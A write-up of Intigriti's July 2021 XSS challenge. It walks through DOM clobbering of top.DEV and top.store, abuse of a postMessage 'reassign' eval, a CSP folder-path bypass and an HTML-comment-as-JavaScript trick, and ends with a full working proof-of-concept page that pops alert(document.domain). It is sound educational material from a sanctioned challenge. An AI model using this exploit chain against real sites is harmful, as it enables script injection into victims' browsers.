# Intigriti's 0721 XSS challenge - by @RootEval

## Target

The challenge is hosted at https://challenge-0721.intigriti.io, and the tweet about it is https://twitter.com/intigriti/status/1419623540375101445.

As stated on the challenge's page, we need to find a way to execute arbitrary JavaScript on the challenge page. However, there are a few rules and information:

```
Rules:
    This challenge runs from July 26th until August 1st, 11:59 PM CET.
    Out of all correct submissions, we will draw six winners on August 2nd:
        Three randomly drawn correct submissions
        Three best write-ups
    Every winner gets a €50 swag voucher for our swag shop
    The winners will be announced on our Twitter profile.
    For every 100 likes, we'll add a tip to announcement tweet.


The solution...
    Should work on the latest version of Firefox or Chrome
    Should execute alert(document.domain).
    Should leverage a cross site scripting vulnerability on this domain.
    Shouldn't be self-XSS or related to MiTM attacks
    Should be reported at go.intigriti.com/submit-solution

```

(taken from https://challenge-0721.intigriti.io / 2021-07-29 09:00 CET)

Right here we notice, that the usual sentence `Should not use any user interaction` is not included in the rules. So this solution might take user interaction.

## Hints

Again Intigriti did not really comply with their rule of releasing hints every 100 likes, but releasing them earlier. In my opinion this was a good decision, since I would have struggled even more without the hints.

1.  > Did you know that JS doesn't support named parameters?
    > https://twitter.com/intigriti/status/1419668830666870794

2.  > Did you know that <a>nchor tags support .username and .password?
    > https://twitter.com/intigriti/status/1419969419158114305

3.  > Did you know that the variable 'x' is very famous? Yes, it's true! The variable is not only known in his for-loop scope, no-no. He's known globally! What an honor to have someone so well-known in our code!
    > https://twitter.com/intigriti/status/1420295778300534785

These hints were published at the time I finished the challenge (2021-07-28 14:00 CET).

## Inspecting and understanding index.php

The root page of the challenge is divided into three different panes:
First pane:

- shows logs and status messages
- e.g. `[log]: Exception called on <img src="x">`
- inspecting the DOM, this pane looks like this:

```html
<iframe class=console src="./console.php"></iframe>
```

Second pane:

- shows the "rendered" HTML, which is entered in the third pane.
- inspecting the DOM, this pane looks like this:

```html
<iframe class=codeFrame src="./htmledit.php?code=<img src=x>"></iframe>
```

Third pane:

- acts as the input for the second pane
- inspecting the DOM, this pane looks like this:

```html
<textarea oninput="this.previousElementSibling.src='./htmledit.php?code='+escape(this.value)"><img src=x></textarea>
```

Inspecting the source of the index.php further, we can find a small JavaScript containing the following:

```html
<script>
    // redirect all htmledit messages to the console
    onmessage = e =>{
      if (e.data.fromIframe){
          frames[0].postMessage({cmd:"log",message:e.data.fromIframe}, '*');
      }
    }
    /*
    var DEV = true;
    var store = {
        users: {
          admin: {
            username: 'inti',
            password: 'griti'
          }, moderator: {
            username: 'root',
            password: 'toor'
          }, manager: {
            username: 'andrew',
            password: 'hunter2'
          },
      }
    }
    */
</script>
```

To put the information from index.php together:

- index.php contains two iframes, pointing to console.php and htmledit.php
- htmledit.php is called with the query parameter `code` containing the HTML code entered in a textarea
- index.php contains a script with the following information:
  - An event listener on "message" events. This is used for cross-origin or cross-frame communication.
    Frames can listen for events with the "message eventlistener and can send message via the `window.postMessage` method.
    What the eventlistener does in in this case is, that it listens for messages and sends them to the first frame - which is in this case the console.php frame.
  - The script additionally contains some code, which is commented out. In that code, a `DEV` and a `store` variable is set.

## Inspecting and understanding the htmledit.php
	
The htmledit.php is injected into the index.php via an iframe:
```html
<iframe class=codeFrame src="./htmledit.php?code=<img src=x>"></iframe>
```

We notice, that the htmledit.php takes a parameter named `code` which is some HTML code. 

If we try to inject XSS here directly via [https://challenge-0721.intigriti.io/htmledit.php?code=%3Cimg%20src=x%20onerror=alert(1)%3E] we can see, that this does not work because of a quite restrictive Content Security Policy.
However the contents of the page looks like that:
	
```html
<!-- &lt;img src=x onerror=alert(1)&gt; -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Native HTML editor</title>
    <script nonce="94c0dff482595b4fbc6ef7551e4e4771">
        window.addEventListener('error', function(e){
            let obj = {type:'err'};
            if (e.message){
                obj.text = e.message;
            } else {
                obj.text = `Exception called on ${e.target.outerHTML}`;
            }
            top.postMessage({fromIframe:obj}, '*');
        }, true);
        onmessage=(e)=>{
            top.postMessage({fromIframe:e.data}, '*')
        }
    </script>
</head>
<body>
    <img src=x onerror=alert(1)></body>
</html>
<!-- /* Page loaded in 0.000016 seconds */ -->
```
	
We notice, that our code is injected twice into that page. Once in a HTML comment at the top, and once inside the body tags. That comment at the top is a bit uncommon and thus it might be interesting for the CTF challenge.

Back to the CSP - it looks like this:
```
content-security-policy: script-src 'nonce-ea99c533295e40c93407e85ff1de9f93'; frame-src https:; object-src 'none'; base-uri 'none';
```
	
Understanding the CSP
- it allows scripts with the given nonce
- the nonce is not really bruteforce or guessable
- it allows frames with the https: scheme
- it does not allow object, embed or applet tags

Basically the CSP is protecting the htmledit.php quite good from XSS - however we can include HTML tags and frames into that page.

Additionally the htmledit.php has some JavaScript contents:
	
```html
<script nonce="ea99c533295e40c93407e85ff1de9f93">
    window.addEventListener('error', function(e){
        let obj = {type:'err'};
        if (e.message){
            obj.text = e.message;
        } else {
            obj.text = `Exception called on ${e.target.outerHTML}`;
        }
        top.postMessage({fromIframe:obj}, '*');
    }, true);
    onmessage=(e)=>{
        top.postMessage({fromIframe:e.data}, '*')
    }
</script>
```

That script registers two eventlisteners. One for errors and on for messages. If an error is caught, the error is send via `postMessage` to the top-frame. Same for messages - they are also send to the top-frame.
	
Outcome of htmledit.php:
	- this page injects HTML code
	- not possible to inject JavaScript
	- the `frame-src` inside the CSP is interesting - especially for CTF challenges this might be a hint ;)
	
## Inspecting and understanding the console.php
	
The console.php starts with a small JavaScript code:
	
```html
<script nonce="5f3eb2ad69fb521ef3b82b57684d712c">
	name = 'Console'
	document.title = name;
	if (top === window){
		document.head.parentNode.remove(); // hide code if not on iframe
	}
</script>
```

This script sets the `window.name` property to `'Console'`. So even if we would try to inject some strings into the name of the window, this would get overwritten here. The `if` condition checks if the window containing console.php is the `top` window, and if so, it completely removes the DOM of the file. Basically, if we open console.php directly, there shouldn't be any DOM. Since I ,like to combine learning new things, I made a small go program, to display the DOM of the pages.

The go program, which gets the DOM of the pages looks like this:
```go
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"time"

	"github.com/chromedp/cdproto/dom"
	"github.com/chromedp/chromedp"
)

func main() {
	var url string
	js := ""

	flag.StringVar(&url, "url", "", "")
	flag.StringVar(&js, "js", "", "")

	flag.Parse()

	ctx, cancel := chromedp.NewContext(
		context.Background(),
	)
	defer cancel()

	var consoleDom string
	var jsOut interface{}

	tasks := getDom(url, &consoleDom)
	if js != "" {
		tasks = append(tasks, chromedp.EvaluateAsDevTools(js, &jsOut))
	}
	err := chromedp.Run(ctx, tasks)

	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("%s\n", consoleDom)
	if jsOut != "" {
		fmt.Print("\nEvaluated JS:\n")
		fmt.Printf("%v\n", jsOut)
	}
}

func getDom(url string, domHtml *string) chromedp.Tasks {
	return chromedp.Tasks{
		chromedp.Navigate(url),
		chromedp.Sleep(2000 * time.Millisecond),
		chromedp.ActionFunc(func(ctx context.Context) error {
			node, err := dom.GetDocument().Do(ctx)
			if err != nil {
				return err
			}

			*domHtml, err = dom.GetOuterHTML().WithNodeID(node.NodeID).Do(ctx)

			return err
		}),
	}
}
```

And the output is what we expected:
	
For console.php:
```html
❯ ./dom-go -u https://challenge-0721.intigriti.io/console.php
<!DOCTYPE html>
```
We can see, that there is no DOM left, if we display the console directly.
	
To check, if the console.php still has DOM left, if it is not the top-frame, we can use the htmledit.php file, which can add frames. To get the contents of that frame, I will run arbitrary JS code in the GO-program. 
	
The call then looks like that:
```html
❯ ./dom-go -url "https://challenge-0721.intigriti.io/htmledit.php?code=<iframe id=frame src=console.php></iframe>" -js "document.getElementById('frame').contentWindow.document.body.outerHTML"
<!-- &lt;iframe id=frame src=console.php&gt;&lt;/iframe&gt; --><!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <title>Native HTML editor</title>
    <script nonce="">
        window.addEventListener('error', function(e){
            let obj = {type:'err'};
            if (e.message){
                obj.text = e.message;
            } else {
                obj.text = `Exception called on ${e.target.outerHTML}`;
            }
            top.postMessage({fromIframe:obj}, '*');
        }, true);
        onmessage=(e)=>{
            top.postMessage({fromIframe:e.data}, '*')
        }
    </script>
</head>
<body>
    <iframe id="frame" src="console.php"></iframe>

<!-- /* Page loaded in 0.000018 seconds */ --></body></html>

Evaluated JS:
<body>
    <ul id="console"><li style="background-color: lightcyan;"><span>Connection status: </span><span>Online</span></li></ul>
    <script nonce="">
        let a = (s) => s.anchor(s);
        let s = (s) => s.normalize('NFC');
        let u = (s) => unescape(s);
        let t = (s) => s.toString(0x16);
        let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string
        let log = (prefix, data, type='info', safe=false) => {
            let line = document.createElement("li");
            let prefix_tag = document.createElement("span");
            let text_tag = document.createElement("span");
            switch (type){
                case 'info':{
                    line.style.backgroundColor = 'lightcyan';
                    break;
                }
                case 'success':{
                    line.style.backgroundColor = 'lightgreen';
                    break;
                }
                case 'warn':{
                    line.style.backgroundColor = 'lightyellow';
                    break;
                }
                case 'err':{
                    line.style.backgroundColor = 'lightpink';
                    break;
                } 
                default:{
                    line.style.backgroundColor = 'lightcyan';
                }
            }
            
            data = parse(data);
            if (!safe){
                data = data.replace(/</g, '&lt;');
            }

            prefix_tag.innerHTML = prefix;
            text_tag.innerHTML = data;

            line.appendChild(prefix_tag);
            line.appendChild(text_tag);
            document.querySelector('#console').appendChild(line);
        } 

        log('Connection status: ', window.navigator.onLine?"Online":"Offline")
        onmessage = e => {
            switch (e.data.cmd) {
                case "log": {
                    log("[log]: ", e.data.message.text, type=e.data.message.type);
                    break;
                }
                case "anchor": {
                    log("[anchor]: ", s(a(u(e.data.message))), type='info')
                    break;
                }
                case "clear": {
                    document.querySelector('#console').innerHTML = "";
                    break;
                }
                default: {
                    log("[???]: ", `Wrong command received: "${e.data.cmd}"`)
                }
            }
        }
    </script>
    
    <script src="./analytics/main.js?t=1627641699"></script>

</body>	
```

What we can see, is the output of the htmledit.php at the top. At the bottom we can see the evaluated JavaScript `document.getElementById('frame').contentWindow.document.body.outerHTML`, which gets the outerHTML of the iframe pointing to console.php. As already assumed, we do see some DOM this time.

If we now further anaylse the console.php page, we will find the script above and need to understand this.
At first, an unordered list with the id `console`:
```html
<ul id="console"></ul>
```

After that, the script begins with the initialization of some functions:
```js
let a = (s) => s.anchor(s);         // [*] creates an anchor (<a>) tag from a string
let s = (s) => s.normalize('NFC');  // [*] returns the Unicode normalisation form of a string
let u = (s) => unescape(s);         // [*] unescapes URL encoded values. example: %22 -> "
let t = (s) => s.toString(0x16);    // [*] takes an number and creates a string with 0x16 (22) as a base. This is a weird manipulation.
let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string | [*] if the parameter is a string, it will be normalized and returned. for non-string arguments, it will be stringified.
```
We notice the one-character method names on the first four methods. I added comments explaining these - all comments starting with `[*]` are added by me and were not present in the challenge.

After this first steps, the `log` method is declared:
```js
let log = (prefix, data, type='info', safe=false) => {
    let line = document.createElement("li");                // [*] create a new list item
    let prefix_tag = document.createElement("span");        // [*] create a new span element
    let text_tag = document.createElement("span");          // [*] create a new span element
    switch (type){
        case 'info':{                                       // [*] set the correct color based on the type
            line.style.backgroundColor = 'lightcyan';
            break;
        }
        case 'success':{
            line.style.backgroundColor = 'lightgreen';
            break;
        }
        case 'warn':{
            line.style.backgroundColor = 'lightyellow';
            break;
        }
        case 'err':{
            line.style.backgroundColor = 'lightpink';
            break;
        } 
        default:{
            line.style.backgroundColor = 'lightcyan';
        }
    }
    
    data = parse(data);                                     // [*] normalises strings; stringifies objects
    if (!safe){                                             // [*] Only do the next steps, if the safe flag is set to false - which is also the default value.
        data = data.replace(/</g, '&lt;');                  // [*] replace all < with their HTML representation. This will prevent from XSS in the most cases.
    }

    prefix_tag.innerHTML = prefix;                          // [*] set the prefix as HTML (always bad if setting strings - better use innerText)
    text_tag.innerHTML = data;                              // [*] set the data as HTML (always bad if setting strings - better use innerText)

    line.appendChild(prefix_tag);                           // [*] append the elements to the list-item and the list-item to the unorderd list
    line.appendChild(text_tag);
    document.querySelector('#console').appendChild(line);
} 
```

This method takes a prefix and data as parameters and appends them to the DOM after some manipulation. The manipulation is about the backgroundcolor, which depends on the flag `type`, and the way the data is sanitized. It will not be sanitized, if the fourth parameter (`safe`) is not false.

In the next lines, the `log` method is called and a "message" eventlistener is added:
```js
log('Connection status: ', window.navigator.onLine?"Online":"Offline")      // [*] Logs the connection status - (creates a new list-item in the unordered list)
onmessage = e => {
    switch (e.data.cmd) {
        case "log": {
            log("[log]: ", e.data.message.text, type=e.data.message.type);  // [*] Logs the `message.text` from the event based on the `message.type`.
            break;
        }
        case "anchor": {
            log("[anchor]: ", s(a(u(e.data.message))), type='info')         // [*] Logs a string representation of an anchor element with the name from `message`,
            break;
        }
        case "clear": {
            document.querySelector('#console').innerHTML = "";              // [*] Clears the contents from the unordered list.
            break;
        }
        default: {
            log("[???]: ", `Wrong command received: "${e.data.cmd}"`)       // [*] default case for every non caught events.
        }
    }
}
```

If we look at the source of console.php, we can find the next script tag - remember I directly commented the code inline prepended with `[*]`:
```html
<script nonce="37e83b19e8bd74d6a12f266164dd4dd5">
try {
    if (!top.DEV)
        throw new Error('Production build!');                            // [*] Throw an error if the DEV variable of the top-most frame is not set.
        
    let checkCredentials = (username, password) => {
        try{
            let users = top.store.users;                                 // [*] this method takes the `store` variable from the top-frame and tries to find 
            let access = [users.admin, users.moderator, users.manager];  // [*] a user with the given username and password.
            if (!users || !password) return false;
            for (x of access) {                                          // [*] Loops through all items in access
                if (x.username === username && x.password === password)
                    return true
            }
        } catch {
            return false
        }
        return false
    }

    let _onmessage = onmessage;                                          // [*] Backup the eventlistener from the first script
    onmessage = e => {
        let m = e.data;
        if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) {  // [*] Check if the given username and password in the event
            return; // do nothing if unauthorized                                                   // [*] can be found in the `store` of the top frame.
        }
    
        switch(m.cmd){
            case "ping": { // check the connection
                e.source.postMessage({message:'pong'},'*');                         // [*] Just a response to a ping
                break;
            }
            case "logv": { // display variable's value by its name
                log("[logv]: ", window[m.message], safe=false, type='info');        // [*] Logs the given variable. More about that after this script-snippet.
                break;
            }
            case "compare": { // compare variable's value to a given one
                log("[compare]: ", (window[m.message.variable] === m.message.value), safe=true, type='info'); // [*] Compares messages and tries to log that "safely".
                break;
            }
            case "reassign": { // change variable's value
                let o = m.message;
                try {
                    let RegExp = /^[s-zA-Z-+0-9]+$/;                               
                    if (!RegExp.test(o.a) || !RegExp.test(o.b)) {                    // [*] Checks if the given variables only contain characters from the RegExp
                        throw new Error('Invalid input given!');
                    }
                    eval(`${o.a}=${o.b}`);                                           // [*] Reassigns the both variables.
                    log("[reassign]: ", `Value of "${o.a}" was changed to "${o.b}"`, type='warn');
                } catch (err) {
                    log("[reassign]: ", `Error changing value (${err.message})`, type='err');
                }
                break;
            }
            default: {
                _onmessage(e); // keep default functions
            }
        }
    }
} catch {
    // hide this script on production
    document.currentScript.remove();    // [*] In case of any error - also if `DEV` is not set on the top-frame - this script gets remove. This is also why we did not see this script in the DOM of the console.php test earlier.
}
</script>
```

The most interesting part is, that the developer of the code tried to use named parameters. This is the reference of the first hint.

If we compare the call of the following 
```js
log("[logv]: ", window[m.message], safe=false, type='info'); 
```
to the declaration of `log`:
```js
let log = (prefix, data, type='info', safe=false)
```

we can see, that the assignment of `type='info'` makes this call a "safe" one. So, calls to `logv` can add HTML to the DOM, which seems like a good starting point to get XSS.

The last line of console.php adds another script:
```js
<script src="./analytics/main.js?t=1627679452"></script>
```

Nevertheless the script in analytics looks like this:
```js
// TODO:
// dont forget to paste analytics code here!!
```

But since this script can be added without a nonce, we should check the CSP.
The CSP for console.php looks like this:

```
script-src 'nonce-6106fd6500bf72d1c190211919ee922e' https://challenge-0721.intigriti.io/analytics/ 'unsafe-eval';frame-src https:;object-src 'none';base-uri 'none';
```

So, yes. Scripts from `/analytics/` can be loaded.

## Putting things together

After analysing the challenge completely, we can see, that the `logv` method from the authenticated `onmessage` is the starting point to inject HTML and JavaScript.

### Having the `<script>` executed

But to get to the `logv` method, we need to bypass some checks. At first, the `onmessage` handler is only set, when the `top.DEV` variable is set. This relies to the commented out script from the index.php. To bypass this check, we need to understand the global `top` variable:

> `window.top` returns a reference to the topmost window in the window hierarchy. (https://developer.mozilla.org/en-US/docs/Web/API/Window/top)

With that knowledge and the knowledge, that HTML elements with IDs expose their references with the respective ID on the window object, we can bypass the `top.DEV` check. We just need a window with an element having the ID `DEV` and an iframe pointing to console.php. We can check that with out go-script from earlier:

Without having a `DEV` element:
```bash
❯ ./dom-go -url "https://challenge-0721.intigriti.io/htmledit.php?code=<iframe id=frame src=console.php></iframe>" -js "'Number of <script>-tags: ' + document.getElementById('frame').contentWindow.document.getElementsByTagName('script').length"
```
will return `Number of <script>-tags: 3`.

With having a `DEV` element:
```bash
❯ ./dom-go -url "https://challenge-0721.intigriti.io/htmledit.php?code=<img id=DEV><iframe id=frame src=console.php></iframe>" -js "'Number of <script>-tags: ' + document.getElementById('frame').contentWindow.document.getElementsByTagName('script').length"
```
will return `Number of <script>-tags: 4`. We have the `top.DEV` check passed!

### Running a `logv` command

Next step would be to run a `logv` command. This works by using the `window.postMessage` method, with an element having the `cmd` property set to `logv`. To do so, we start developing our own HTML file, which sets up the `top.DEV` bypass and then runs a `postMessage` to the correct window. 
However, this does not log anything, because we are missing the correct credentials. The `onmessage` handler we are focusing is doing a `checkCredentials` for each received message, containing the `credentials.username` and `credentials.password` properties from the message. So we include this also in our first payload:

```html
<html>
<head></head>
<body>
    <script>
        function sendToAllFrames(wind, data){
            for(let i=0;i<wind.frames.length;i++){
                wind.frames[i].postMessage(data, "*");
                if(wind.frames[i].frames.length>0)
                    sendToAllFrames(wind.frames[i], data);
            }
        }

        const url = `https://challenge-0721.intigriti.io/htmledit.php?code=`;
        const base = `<img id="DEV"><iframe src="console.php">`;

        const win = window.open(`${url}${encodeURIComponent(base)}`, "test");

        setTimeout(()=>{
            sendToAllFrames(win, {credentials:{username:"test",password:"test"},cmd:"logv",message:"name"});
        }, 1000);
    </script>
</body>
</html>
```

This HTML file opens a new popup, pointing to `htmledit.php`, which then loads the `DEV` element and the `iframe` pointing to console.php. Additionally I wrote a small function, which sends the message to all frames under a window reference. By doing so, I do not need to figure out, which frame I need to send the message to.

Nevertheless, nothing is printed to the unordered list. If we debug the `checkCredentials` method, we can see, that the referecen to `top.store.users` and ultimately `top.store.users.admin` is missing. We should be able to bypass this aswell with DOM clobbering, as we did with the `top.DEV` reference. Using (this article)[https://portswigger.net/research/dom-clobbering-strikes-back] from @garethheyes, we can find ways to use clobbering for more than 3 levels deep using nested iframes with the srcdoc attribute.

Our payload - which is the code send to the htmledit.php - should now look something like this:
```html
<iframe
  name="store"
  srcdoc="<iframe srcdoc='<a id=admin href=ftp:test:test@test>test</a>' name=users>"
></iframe
><img id="DEV" /><iframe src="console.php"></iframe>
```
This is using an iframe named `store`, having a nested iframe named `users` and a nested `a` element named `admin`. This bypasses the `top.store.users.admin` reference. Again in (this article)[https://portswigger.net/research/dom-clobbering-strikes-back] we also find that anchor tags can have `username` and `password` properties using basic auth in their `href` attribute.

If we run this, we see the name of the window - `Console` - printed in the DOM.

At this stage we have some kind of content injection. However, we currently do not control, which content is injected. 

### Getting HTML injection

To get HTML injection, we should try to get a list of variables, which can possibly get printed out to the DOM. At some stage, when looking at the RegExp `/^[s-zA-Z-+0-9]+$/` from the `reassign` method, I wanted to see, which variables on the window object comply with this regex. I did this with the following script:

```js
const rx=/^[s-zA-Z-+0-9]+$/;
const properties=Object.getOwnPropertyNames(window)
for(let property of properties){rx.test(property)&&console.log(property)}
```

This should print out the variables on the `window` object, I can use in the `reassign` method. Maybe this also gives some information about the variable, we should log using `logv`? And yes, the output was successful and we got a variable `x`:
```
CSS 
U2F 
URL 
JSON 
x 
```

Where is `x` coming from? `x` is the reference from the for-loop inside of `checkCredentials`. This `x` is not prepended with `var`,`let` or `const` and is thus globally available on the `window` object. We now also know, that `x` is pointing to the anchor element inside our payload. And this is nice, because we have quite a good control over this element. However, if we try to log `x` using `logv` we only get `{}` as an output. This is because of the `JSON.stringify` inside the `parse` method on variables, which are not string types. 

But luckily we can get a string from the `x` variable quite easily. We know, that the `toString` method on anchor elements will return the href attribute (https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/toString). And by appending some integer to `x` we can trigger the `toString` method.

Putting this in our HTML will result in the following:
```js
sendToAllFrames(win, {credentials:{username:"test",password:"test"},cmd:"reassign",message:{a:"z",b:"x"}});
sendToAllFrames(win, {credentials:{username:"test",password:"test"},cmd:"reassign",message:{a:"z+",b:"0"}});
sendToAllFrames(win, {credentials:{username:"test",password:"test"},cmd:"logv",message:"z"});
```

What this is doing is basically:
```js
z=x;
z+=0;
logv(z);
```

And now we can see the URL of the anchor element on the page. I immediately though about appending queryparameters to the URL inside the href, to get some HTML input there and changed the href to `href=ftp:test:test@a?c=<marquee>test</marquee>`. However, even when putting this into our HTML code, I noticed that this needs to be HTML encoded, resulting in the full payload beeing:
```js
const base=`<iframe name=store srcdoc="<iframe srcdoc='<a id=admin href=ftp:test:test@a?c=${encodeURIComponent(`<marquee>test</marquee>`)}>test</a>' name=users>"></iframe><img id="DEV"><iframe src="console.php">`;
```

Running this showed the full URL in the DOM with the encoded `<>` tags and was not resulting in the HTML injection. We however already noted, that there is this method `u` beeing `let u = (s) => unescape(s);`. If we can call this method on the string printed out, we can get HTML injection. 
Having a look at `parse`, which is called on each log message printed out, we see, that `parse` is calling the `s` method. This is really promising, because both characters `s` and `u` are allowed by the RegExp in the `reassign` method. So we just reassign `s` beeing `u` and we should get HTML injection:

```js
sendToAllFrames(win, {credentials:{username:"test",password:"test"},cmd:"reassign",message:{a:"z",b:"x"}});
sendToAllFrames(win, {credentials:{username:"test",password:"test"},cmd:"reassign",message:{a:"z+",b:"0"}});

sendToAllFrames(win, {credentials:{username:"test",password:"test"},cmd:"reassign",message:{a:"s",b:"u"}});

sendToAllFrames(win, {credentials:{username:"test",password:"test"},cmd:"logv",message:"z"});
```

And indeed, using this, we successfully have HTML injection!

### Bypassing the CSP

Having HTML injection does not automatically mean, we are also able to perform XSS. The CSP is blocking normal inline JavaScript code. But however we have the CSP pointing to `/analytics/` with the analytics file beeing empty. This should be the way to go, otherwise it would not be in the challenge.

At first I thought that there is maybe another script somewhere in the `/analytics` directory, but looking for some scripts did not turn out successfully. Then I read about the (Folder Bypass)[https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#folder-path-bypass]. So I used the following payload to see, if the CSP will block the request or not:
```js
const base=`<iframe name=store srcdoc="<iframe srcdoc='<a id=admin href=ftp:test:test@a?c=${encodeURIComponent(`<script src=/analytics/../index.php>`)}%3c${encodeURIComponent(`/script>`)}>test</a>' name=users>"></iframe><img id="DEV"><iframe src="console.php">`;
```

NB: I needed to break the closing `</script>` so it won't break the script initially.

However, nothing happened with this payload. No error, no console output, nothing saying the CSP blocked it. When checking the DOM, we can see, that the `<script>` will be appended into a `<span>` tag. This is also what we see in the `log` method. However script tags do not work inside of `span` elements. We somehow need to break out of this, to get script execution. Prepending a `</span>` does also not work, because of the way, the `span` element is created. Using another `iframe` with `srcdoc` attribute helped us getting script execution:

```js
const base=`<iframe name=store srcdoc="<iframe srcdoc='<a id=admin href=ftp:test:test@a?c=${encodeURIComponent(`<iframe srcdoc='<script src=/analytics%2f..%2findex.php>`).replace(/'/g, "%27")}%3c${encodeURIComponent(`/script>`)}${encodeURIComponent(`'</iframe>`).replace(/'/g, "%27")}>test</a>' name=users>"></iframe><img id="DEV"><iframe src="console.php">`;
```

NB: `encodeURIComponent` does not encode single quotes, thus we needed to append some `.replace(/'/g, "%27")` where needed.

However, this looked promising as we got a `Uncaught SyntaxError: expected expression, got '<'` in the console. This was obviously since the index.php did not contain vaild JavaScript. 

To get valid JavaScript I checked all the smart parts of the challenge again and was thinking about, why the code inside the htmledit.php is also reflected at the top of the page inside an HTML comment. Then I remembered some years ago, where JavaScript inside of (X)HTML often was surrounded with HTML comments to prevent browsers not beeing able to run JavaScript print it into the DOM. A small research found this StackOverflow comment: https://stackoverflow.com/a/40890155/1666993

`<!--` are treated as `//` in JavaScript. Great, we just try to load the script from htmledit.php, having a `code` with a linebreak followed by the target `alert(document.domain)`:

```js
const base=`<iframe name=store srcdoc="<iframe srcdoc='<a id=admin href=ftp:test:test@a?c=${encodeURIComponent(`<iframe srcdoc='<script src=/analytics%2f..%2fhtmledit.php?code=${encodeURIComponent(`\nalert(document.domain);/*`)}>`).replace(/'/g, "%27")}%3c${encodeURIComponent(`/script>`)}${encodeURIComponent(`'</iframe>`).replace(/'/g, "%27")}>test</a>' name=users>"></iframe><img id="DEV"><iframe src="console.php">`;
```

And voilá, we got our XSS!

##############

The full PoC code:
```html
<html>
  <head></head>
  <body>
    <script>
      function sendToAllFrames(wind, data) {
        for (let i = 0; i < wind.frames.length; i++) {
          wind.frames[i].postMessage(data, "*");
          if (wind.frames[i].frames.length > 0)
            sendToAllFrames(wind.frames[i], data);
        }
      }

      const url = `https://challenge-0721.intigriti.io/htmledit.php?code=`;
      const base = `<iframe name=store srcdoc="<iframe srcdoc='<a id=admin href=ftp:test:test@a?c=${encodeURIComponent(
        `<iframe srcdoc='<script src=/analytics%2f..%2fhtmledit.php?code=${encodeURIComponent(
          `\nalert(document.domain);/*`
        )}>`
      ).replace(/'/g, "%27")}%3c${encodeURIComponent(
        `/script>`
      )}${encodeURIComponent(`'</iframe>`).replace(
        /'/g,
        "%27"
      )}>test</a>' name=users>"></iframe><img id="DEV"><iframe src="console.php">`;
      const win = window.open(`${url}${encodeURIComponent(base)}`, "test");

      setTimeout(() => {
        sendToAllFrames(win, {
          credentials: { username: "test", password: "test" },
          cmd: "reassign",
          message: { a: "z", b: "x" },
        });
        sendToAllFrames(win, {
          credentials: { username: "test", password: "test" },
          cmd: "reassign",
          message: { a: "z+", b: "0" },
        });

        sendToAllFrames(win, {
          credentials: { username: "test", password: "test" },
          cmd: "reassign",
          message: { a: "s", b: "u" },
        });

        sendToAllFrames(win, {
          credentials: { username: "test", password: "test" },
          cmd: "logv",
          message: "z",
        });
      }, 1000);
    </script>
  </body>
</html>
```

The full code of the go program:
```go
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"time"

	"github.com/chromedp/cdproto/dom"
	"github.com/chromedp/chromedp"
)

func main() {
	var url string
	js := ""

	flag.StringVar(&url, "url", "", "")
	flag.StringVar(&js, "js", "", "")

	flag.Parse()

	ctx, cancel := chromedp.NewContext(
		context.Background(),
	)
	defer cancel()

	var consoleDom string
	var jsOut interface{}

	tasks := getDom(url, &consoleDom)
	if js != "" {
		tasks = append(tasks, chromedp.EvaluateAsDevTools(js, &jsOut))
	}
	err := chromedp.Run(ctx, tasks)

	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("%s\n", consoleDom)
	if jsOut != "" {
		fmt.Print("\nEvaluated JS:\n")
		fmt.Printf("%v\n", jsOut)
	}
}

func getDom(url string, domHtml *string) chromedp.Tasks {
	return chromedp.Tasks{
		chromedp.Navigate(url),
		chromedp.Sleep(2000 * time.Millisecond),
		chromedp.ActionFunc(func(ctx context.Context) error {
			node, err := dom.GetDocument().Do(ctx)
			if err != nil {
				return err
			}

			*domHtml, err = dom.GetOuterHTML().WithNodeID(node.NodeID).Do(ctx)

			return err
		}),
	}
}
```
